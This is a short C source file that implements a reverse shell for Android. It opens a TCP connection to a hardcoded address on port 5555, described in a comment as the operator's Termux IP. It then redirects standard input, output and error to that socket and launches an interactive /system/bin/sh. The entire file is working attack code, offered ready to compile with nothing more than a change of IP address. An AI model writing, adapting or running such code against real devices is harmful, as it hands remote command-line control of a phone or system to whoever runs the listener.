#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    // CHANGE THIS to your Termux IP
    char *ip = "10.8.234.87"; 
    int port = 5555;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) return 1;

    // Redirect STDIN, STDOUT, and STDERR to the socket
    dup2(s, 0); 
    dup2(s, 1); 
    dup2(s, 2);

    // Execute the shell
    char *args[] = {"/system/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);

    return 0;
}
